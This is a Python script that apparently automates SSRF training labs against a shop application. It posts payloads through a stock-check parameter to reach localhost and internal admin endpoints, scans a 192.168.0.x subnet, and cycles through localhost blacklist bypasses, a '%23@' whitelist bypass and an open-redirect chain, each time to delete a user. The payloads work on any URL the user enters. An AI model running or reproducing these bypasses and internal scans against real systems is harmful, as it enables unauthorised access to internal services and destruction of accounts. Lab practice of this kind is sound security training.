import requests
from tabulate import tabulate
from urllib.parse import urlparse
from urllib.parse import quote

class textcolor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    DANGER = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class SSRFVulnerability:

    def __init__(self, base_url):
        # assign base URL for all lab scenarios
        self.base_url = base_url
        self.verify = 'Carlos'
        self.banner = 'Congratulations, you solved the lab!'

    def http_request(self, url):
        '''
        This is a common function used to send HTTP requests with customized payloads
        '''
        payload = {'stockApi': url}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}
        try:
            response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
            return response

        except requests.exceptions.ConnectTimeout as e:
            return 1
        except requests.exceptions.RequestException as e:
            print("\n"+textcolor.DANGER+"Error occurred: "+textcolor.ENDC)
            print(f"{str(e)}\n")
        except Exception as e:
            print(f"\n"+textcolor.DANGER+"Unexpected error occurred:"+textcolor.ENDC)
            print(f"{str(e)}\n")

        return 0

    def local_system(self):
        '''
        Lab 1: Basic SSRF against the local server
        '''
        payloadURL = 'http://localhost/admin/delete?username=carlos'
        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
        return 1 if self.banner in self.http_request(payloadURL).text else 0

    def internal_system(self):
        '''
        Lab 2: Basic SSRF against another back-end system
        '''
        try:
            for i in range(1, 256):

                ip = '192.168.0.'+str(i)
                response = self.http_request('http://'+ip+':8080'+'/admin')

                print(textcolor.OKCYAN+" [*] Checking "+str(ip)+": "+str(response.status_code)+" HTTP status"+textcolor.ENDC,end="\r")

                if response and response.status_code == 200:
                    print(textcolor.OKGREEN+"\n\n"+ip+": 200 HTTP status"+textcolor.ENDC)
                    payloadURL = 'http://'+ip+':8080'+'/admin/delete?username=carlos'
                    print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
                    return 1 if self.http_request(payloadURL) else 0    
        except:
            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
            return 0
        
    def blacklist_filter(self):
        '''
        Lab 3: SSRF with blacklist-based input filter
        '''
        # bypasses for localhost domain
        bypasses = ['localhost','127.0.0.1', '127.1', '::1', '0:0:0:0:0:0:0:1', '::ffff:127.0.0.1', '127%2e0%2e0%2e1', '127%2e1']
        try:
            for i in bypasses:
                response = self.http_request('http://'+i)
                print(textcolor.OKCYAN+" [*] trying to bypass using "+str(i)+": "+str(response.status_code)+" HTTP status           "+textcolor.ENDC,end="\r")
                if response.status_code == 200:
                    print(textcolor.OKGREEN+"\n\n["+i+"] 200 HTTP status"+textcolor.ENDC)
                    # url encode twice to bypass the defense
                    payloadURL = 'http://'+i+'/%61dmin/delete?username=carlos'
                    print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
                    response = self.http_request(payloadURL)
                    return 1 if self.banner in response.text else 0
        except:
            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
            return 0
        
    def whitelist_filter(self):
        '''
        Lab 4: SSRF with whitelist-based input filter
        '''
        # appending localhost with original domain using URL fragmentation 
        payloadURL = 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'
        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
        try:
            response = self.http_request(payloadURL)
            return 1 if self.banner in response.text else 0
            
        except:
            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
            return 0
        
    def open_redirection(self):
        '''
        Lab 5: Bypassing SSRF filters via open redirection
        '''
        payloadURL = '/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
        try:
            response = self.http_request(payloadURL)
            return 1 if self.verify not in response.text else 0
            
        except:
            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
            return 0


def validate_url(url):
    parsed_url = urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        return True
    return False

def handle_choice(number, instance):
    '''
    This function is used to handle different user input choices that 
    executes different lab exercises with their respective payloads
    '''
    if number == 1:
        if instance.local_system():
            print(textcolor.OKGREEN+"Local Server: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 2:  
        if instance.internal_system():
            print(textcolor.OKGREEN+"Remote Server: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 3:
        if instance.blacklist_filter():
            print(textcolor.OKGREEN+"Blacklist Bypass: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 4:
        if instance.whitelist_filter():
            isFailed = False
            print(textcolor.OKGREEN+"Whitelist Bypass: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 5:
        if instance.open_redirection():
            isFailed = False
            print(textcolor.OKGREEN+"Open Redirection: Username Deleted Successfully\n"+textcolor.ENDC)

    else:
        print(textcolor.DANGER+"\nInvalid choice."+textcolor.ENDC)

def main():
    try:
        url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
        return

    # Validate the URL
    if not validate_url(url):
        print(textcolor.DANGER+"Invalid URL: Check properly\n"+textcolor.ENDC)
        return

    data = [
        [textcolor.OKBLUE+"(1)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC],
        [textcolor.OKBLUE+"(2)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
        [textcolor.OKBLUE+"(3)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC],
        [textcolor.OKBLUE+"(4)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with whitelist-based input filter"+textcolor.ENDC],
        [textcolor.OKBLUE+"(5)"+textcolor.ENDC, textcolor.OKBLUE+"Bypassing SSRF filters via open redirection"+textcolor.ENDC]
    ]

    headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC]

    # Generate the table
    table = tabulate(data, headers, tablefmt="pretty")

    # Print the table
    print("\n"+table)

    try:
        choice = input("\n"+textcolor.WARNING+"Enter your Lab (1-7): "+textcolor.ENDC)
        #choice = 2
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
        return

    # Create an instance of SSRFVulnerability with the base URL of the shopping application
    instanceVar = SSRFVulnerability(url)

    try:
        handle_choice(int(choice), instanceVar)
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)

if __name__ == '__main__':
    main()
